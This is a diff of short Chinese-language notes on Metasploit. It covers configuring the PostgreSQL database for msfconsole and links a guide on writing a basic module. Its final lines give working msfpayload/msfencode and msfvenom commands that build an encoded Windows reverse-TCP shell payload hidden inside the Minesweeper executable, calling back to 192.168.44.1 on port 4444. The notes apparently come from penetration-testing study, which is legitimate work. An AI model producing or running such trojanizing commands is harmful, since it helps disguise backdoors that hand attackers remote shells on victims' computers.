@@ -1,3 +1,17 @@
+﻿最简单的输出模块
+su postgres
+createuser msf -P -S -R -D
+createdb -O msf msf
+之后psql进去可以看到有msf数据库
+在psql中使用  \password 重新设置postgres的连接密码
+之后配置 /opt/metasploit-framework/config/database.yml中的数据库名字、用户名、密码
+再启动msfconsole就不会出现数据库密码错误了
+接着 db_rebuild_cache (如果失败了就先disconnect再connect再rebuild即可)
+接着就可以高速搜索了
+
+编写最简单的输出模块 - 
+https://www.offensive-security.com/metasploit-unleashed/building-module/
+
 msfpayload windows/shell/reverse_tcp LHOST=192.168.44.1 LPORT=4444 X | msfencode -x /media/Data/Winmine__XP.exe -e x86/shikata_ga_nai -c 4 -t exe > /media/Data/payload2.exe
 
 msfvenom -p windows/shell/reverse_tcp LHOST=192.168.44.1 LPORT=4444 -x /media/Data/Winmine__XP.exe -e x86/shikata_ga_nai -i 4 -f exe -b '\x00' > /media/Data/payload2.exe
